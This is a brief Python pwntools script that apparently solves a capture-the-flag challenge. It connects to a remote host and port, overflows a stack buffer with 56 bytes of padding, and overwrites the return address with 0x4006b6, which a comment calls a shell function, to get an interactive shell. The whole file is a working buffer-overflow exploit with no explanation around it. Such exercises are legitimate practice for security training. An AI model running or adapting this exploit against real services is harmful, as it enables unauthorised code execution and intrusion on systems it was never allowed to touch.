from pwn import *

#context.log_level = 'debug'
p = remote('140.110.112.192', 2118)
#stack size 0x30, shell function at 0x4006b6

payload = 'A'*(48 + 8) + p64(0x4006b6)
print p.recv()
p.sendline(payload)

p.interactive()
p.close()